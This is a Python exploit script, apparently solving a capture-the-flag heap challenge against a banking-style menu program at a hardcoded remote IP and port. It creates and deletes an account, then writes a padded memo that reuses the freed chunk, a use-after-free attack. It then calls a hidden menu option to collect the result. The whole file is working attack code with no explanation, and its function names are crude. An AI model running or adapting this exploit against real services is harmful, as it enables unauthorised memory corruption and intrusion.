import re
import sys
import socket
import telnetlib
from hexdump import hexdump
from struct import pack, unpack

current_chunk = 0
current_memo_chunk = 0

def readuntil(f, delim=':'):
	buf = ''
	while not buf.endswith(delim):
		buf += f.read(1)
	return buf

def interact(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def log_nl(buf):
	sys.stdout.write(buf + chr(0x0a))

def log(buf):
	sys.stdout.write(buf)

def mem2chunk(addr):
	return (addr - 8)

def create_account(f, fname, lname):
	global current_chunk
	readuntil(f, delim=': ')
	f.write(str(1) + chr(0x0a))
	readuntil(f, delim=': ')
	f.write(fname + chr(0x0a))
	readuntil(f, delim=': ')
	f.write(lname + chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf != '':
		current_chunk = int(re.findall(r'(\d+)\.$', buf)[0])
		log_nl("- allocate chunk (mem: {}, chunk: {})".format(hex(current_chunk), hex(mem2chunk(current_chunk))))

def display_account(f):
	global current_chunk
	# trash output
	readuntil(f, delim=': ')
	f.write(str(2) + chr(0x0a))
	# trash output
	readuntil(f, delim=chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf != '':
		current_chunk = int(re.findall(r'(?:\#{16}) (?:Account no\.) (\d+) (?:\#{16})', buf)[0])
		log("- contents of (mem: {}, chunk: {}) ".format(hex(current_chunk), hex(mem2chunk(current_chunk))))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf != '':
		sp = buf.split(' ')
		log("=> (first-name: {}, ".format(sp[2].rstrip()))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf != '':
		sp = buf.split(' ')
		log("last-name: {}, ".format(sp[2].rstrip()))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf != '':
		sp = buf.split(' ')
		log_nl("account-balance: {})".format(sp[2]))

def delete_account(f):
	readuntil(f, delim=': ')
	f.write(str(3) + chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf == 'Account deleted successfully':
		log_nl('- freeing chunk (mem: {}, chunk: {})'.format(hex(current_chunk), hex(mem2chunk(current_chunk))))

def add_memo(f, memo_buf):
	global current_memo_chunk
	readuntil(f, delim=': ')
	f.write(str(4) + chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	f.write(memo_buf + chr(0x0a))
	readuntil(f, chr(0x0a))
	readuntil(f, chr(0x0a))
	buf = readuntil(f, chr(0x0a)).rstrip()
	if buf != '':
		current_memo_chunk = int(buf.split(' ')[9].rstrip('.'))
		log_nl("- allocate chunk (mem: {}, chunk: {})".format(hex(current_memo_chunk), hex(mem2chunk(current_memo_chunk))))

def asshole_was_on_fire(f):
	readuntil(f, delim=': ')
	f.write(str(5) + chr(0x0a))
	readuntil(f, delim=chr(0x0a))
	buf = readuntil(f, delim=chr(0x0a)).rstrip()
	if buf == '':
		log_nl("- get your ass ready first :)")
	else:
		log_nl("- fire in the hole: {}".format(buf))

s = socket.create_connection(("206.189.25.23", 31238))
f = s.makefile('rw', bufsize=0)

create_account(f, 'aaaa', 'bbbb')
delete_account(f)	
add_memo(f, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPfuck')
asshole_was_on_fire(f)